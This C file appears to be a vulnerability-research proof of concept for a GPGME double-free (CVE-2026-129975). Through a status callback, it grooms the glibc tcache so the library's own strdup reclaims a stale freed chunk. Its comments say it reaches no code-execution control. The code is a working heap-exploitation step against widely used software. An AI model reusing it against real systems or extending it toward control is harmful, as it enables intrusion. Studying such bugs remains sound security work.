/* Plain-glibc tcache-capacity probe for CVE-2026-129975.
 *
 * Public APIs only. W9 showed that GPGME's own strdup(rest) at
 * engine-gpg.c:1564 reclaims the 0x410 status chunk freed by realloc at
 * :1494, so status.buffer and cmd.keyword alias and gpg_release frees the
 * same chunk twice (tcache double-free abort). This driver asks whether a
 * full 0x410 tcache bin at the first of those two frees changes the plain
 * glibc outcome. TCACHE_FULL=1 fills the bin to seven entries with lab
 * chunks and arranges for the library's strdup to take the stale chunk off
 * the top of that bin; TCACHE_FULL=0 is the W9 control.
 *
 * This is rung-4 allocator mechanics: no pointer/IP/command control, no
 * chosen-address write, no side effect and no rung-5 claim.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;
static char *fill[7];
static char *extra;

static gpgme_error_t
monitor_cb (void *opaque, const char *keyword, const char *args)
{
  (void) opaque;
  int i;
  const char *full = getenv ("TCACHE_FULL");
  int do_full = full && strcmp (full, "0");

  cb_calls++;
  fprintf (stderr, "mon_cb call=%d keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);

  if (!strcmp (keyword, "GET_LINE") && strlen (args) > 500 && do_full)
    {
      /* realloc already freed the stale 0x410 chunk; the first malloc of
         this size returns it. Drain the bin, then refill it with the stale
         chunk freed LAST so the library's strdup takes it from the top. */
      for (i = 0; i < 7; i++)
        {
          fill[i] = malloc (1024);
          if (fill[i])
            memset (fill[i], 0x47, 1024);
        }
      for (i = 1; i < 7; i++)
        free (fill[i]);
      free (fill[0]);
      fprintf (stderr, "tcache_refill fill0=%p\n", (void *) fill[0]);
    }
  else if (!strcmp (keyword, "GOOD") && strlen (args) > 500)
    {
      if (do_full && extra)
        {
          /* Sixth entry was taken by strdup; restore a full bin of seven
             before the stale pointer is freed in gpg_release. */
          free (extra);
          extra = NULL;
          fprintf (stderr, "tcache_full extra freed\n");
        }
      return gpg_error (GPG_ERR_GENERAL);
    }
  return 0;
}

static gpgme_error_t
passphrase_cb (void *hook, const char *uid_hint, const char *passphrase_info,
               int prev_was_bad, int fd)
{
  (void) hook; (void) uid_hint; (void) passphrase_info; (void) prev_was_bad;
  (void) fd;
  return gpg_error (GPG_ERR_CANCELED);
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_data_t keydata = NULL;
  gpgme_error_t err;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }
  extra = malloc (1024);
  if (extra)
    memset (extra, 0x46, 1024);
  if (!gpgme_check_version (NULL))
    return 2;
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, monitor_cb, NULL);
  gpgme_set_passphrase_cb (ctx, passphrase_cb, NULL);

  err = gpgme_data_new (&keydata);
  if (err)
    return 2;
  err = gpgme_op_export (ctx, NULL, 0, keydata);
  fprintf (stderr, "op1 export err=%s cb_calls=%d\n",
           gpgme_strerror (err), cb_calls);
  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "op2 keylist_start err=%s cb_calls=%d\n",
           gpgme_strerror (err), cb_calls);
  while (!err)
    {
      gpgme_key_t key = NULL;
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  gpgme_data_release (keydata);
  gpgme_release (ctx);
  puts ("release done");
  return 0;
}
